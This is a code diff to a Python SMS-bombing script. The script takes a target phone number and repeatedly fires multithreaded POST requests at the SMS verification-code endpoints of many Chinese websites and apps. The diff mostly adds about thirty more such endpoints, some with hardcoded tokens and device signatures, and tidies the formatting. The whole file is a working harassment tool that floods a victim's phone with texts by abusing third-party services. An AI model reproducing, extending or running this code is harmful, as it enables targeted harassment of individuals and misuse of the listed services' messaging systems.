@@ -1,9 +1,10 @@
 # 导入必要的库
-import requests
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import argparse
 import logging
 import time
-import argparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+import requests
 
 # 设置日志记录的基本配置
 # 设置日志配置
@@ -16,7 +17,7 @@ parser = argparse.ArgumentParser(description="多线程请求脚本")
 parser.add_argument("-p", "--phone", type=str, help="手机号")
 parser.add_argument("-f", "--frequency", type=int, help="循环次数")
 parser.add_argument("-i", "--interval", type=int, help="间隔时间（秒）", default=60)
-parser.add_argument("-inter","--interactive", action="store_true", help="启用交互模式")
+parser.add_argument("-inter", "--interactive", action="store_true", help="启用交互模式")
 args = parser.parse_args()
 
 # 处理交互模式输入
@@ -149,7 +150,145 @@ requests_config = [
                                                                                    "platId": "T2023041400000000001",
                                                                                    "isEncrypt": 0,
                                                                                    "sessionId": "", }},
+    {"url": "https://homedoctor.grdoc.org/api/common/captcha/send",
+     "data": {"token": "69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4", "role": "user", "scene": 1,
+              "telephone": phone, }},
+    {"url": "https://passport.xag.cn/home/sms_code", "data": {"icc": "86", "phone": phone}},
+    {"url": "https://api.paozhengtong.com/notarize/user/sendMessage", "data": {"phone": phone}},
+    {"url": "https://api.9tax.com/newspaper/user/sendMessage", "data": {"phone": phone}},
+    {"url": "https://api.shengtuanyouxuan.com/mini/life/v1/captcha/getCaptcha", "data": {
+        "phone": phone,
+        "bizCode": "miniBindPhone"
+    }},
+    {"url": "https://m.midea.cn/next/user_assist/getmobilevc", "data": {"scene": "terminal_shop", "mobile": phone}},
+    {"url": "https://web.tlawyer.cn/account/sendsmsregister", "data": {"phone": phone}},
+    {
+        "url": "https://wap-api.duoyou.com/index.php/member/send_verification?game_id=100206&media_id=dy_59639386&is_red_sdk=1&idfa=89238414-3824-4F4D-BC95-8DABAB134023",
+        "data": {
+            "scene": "smsLogin",
+            "mobile": phone
+        }},
+    {"url": "https://passport.xag.cn/home/sms_code", "data": {"icc": "86", "phone": phone}},
+    {"url": "https://m-sqhlwyy.panyu.gd.cn/med/gateway/640009/ytGateway", "data": {
+        "api_name": "/r/10001/103@udb3",
+        "phoneNo": phone
+    }},
+    {"url": "https://fcm2-5.ocj.com.cn/api/newMedia/login/mini/login/securityCode", "data": {
+        "phone": phone,
+        "purpose": "quick_register_context"
+    }},
+    {
+        "url": "https://api.cdfsunrise.com/restapi/user/sendMobileCode",
+        "data": {
+            "mobileCodeType": "mobileLogin",
+            "mobileNo": phone,
+            "sign": "md5sign",
+            "timeStamp": "1713177231575",
+            "deviceId": "Bkm9UNmPJJnDQ+JUmFhfc+gHKSId9U/vXW6S1Fremx0ex4JnwRIcgGva0jXeA1hFmgCHgjsSYh1ZcYUwXv+tufw==",
+            "rid": ""
+        }
+    },
+    {
+        "url": "https://vipainisheng.com/user/app/open/user/sendSms",
+        "data": {
+            "jmxygtz": "",
+            "vcVersionCode": "1.6.2",
+            "language": "zh_CN",
+            "loginDevictType": "XCX",
+            "appCode": "JS",
+            "xcxAppId": "wx5f198a7cd2798103",
+            "mobile": phone,
+            "affairType": 1,
+            "area": "+86",
+            "en": "Hf5FRgv5tjYBW5FIgJG6Mpp94VaqgFNVugxYQks0Us67L2ujaFcjOWRMVj1V4swL/rVe5ADkyXimIJ53T194Fg==",
+            "uuid": "",
+            "captchaCode": ""
+        }
+    },
+    {
+        "url": "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code",
+        "data": {
+            "mobile": phone,
+            "captcha": "1111",
+            "token": "1111",
+            "prefix": 86
+        }
+    },
+    {
+        "url": "https://community.lishuizongzhi.com/wx-life/mc/auth/code",
+        "data": {"phone": phone}
+    },
+    {
+        "url": "https://api-smart.ddzuwu.com/api/users/login/send-sms",
+        "data": {'phone': phone}
+    },
+    {
+        "url": "https://api.boxtrip.vip/v1/api/sms/login",
+        "data": {
+            "mobile": phone,
+        }
+    },
+    {
+        "url": "https://anmo.jiudiananmo.com/index.php?i=666&t=0&v=3.0&from=wxapp&c=entry&a=wxapp&do=api&core=core2&m=longbing_massages_city&s=massage/app/Index/sendShortMsg&urls=massage/app/Index/sendShortMsg",
+        "data": {"phone": phone}
+    },
+    {
+        "url": "https://api.dingdong.lrswlkj.com/auth/sendLoginMobileCode",
+        "data": {
+            "mobile": phone,
+            "type": 0
+        }
+    },
+    {
+        "url": "https://mgr.moyunk.com/api/appAuth/smsCode",
+        "data": {
+            "mobile": phone
+        }
+
+    },
+    {
+        "url": "https://api.jishizhijia.com/technician-home/login/sendMsg",
+        "data": {"tel": phone}
+    },
+    {
+        "url": "https://api.tuituidj.com/h5/customer/loginSms",
+        "data": {"phone": phone}
+    },
+    {
+        "url": "https://api.meipao.vip/make_rider/v1/send_provider_sms",
+        "data": {
+            "mobile": phone,
+            "type": "rider_login",
+            "m": "make_rider",
+            "uniacid": "0"
+        }
+    },
+    {
+        "url": "https://open.iconntech.com/unifyUser/sendMsg",
+        "data": {
+            "msgType": "01",
+            "mobile": phone
+        }
+
+    },
+    {
+        "url": "https://app.dianjingjob.com/api/v1/5f8aa4831930c",
+        "data": {
+            "is_test": 0,
+            "mobile": phone,
+            "type": "1"
+        }
+    },
+    {
+        "url": "https://xnvfgk.sjrjyffs.top/api/app/sms/getcode",
+        "data": {
+            "systemType": 4,
+            "phonenumber": phone
+        }
+    }
+
 ]
+
 
 # 定义一个函数来发送POST请求并处理响应
 def make_request(config):
@@ -172,6 +311,7 @@ def make_request(config):
         logging.error(f"请求失败: {config['url']} - {e}")
         return None
 
+
 # 定义一个函数来执行多线程请求
 def 多线程():
     """
@@ -189,6 +329,7 @@ def 多线程():
                 logging.info(f"响应内容: {result}")
             # 按照设定的间隔时间休眠
             time.sleep(interval)
+
 
 # 主程序入口
 if __name__ == '__main__':
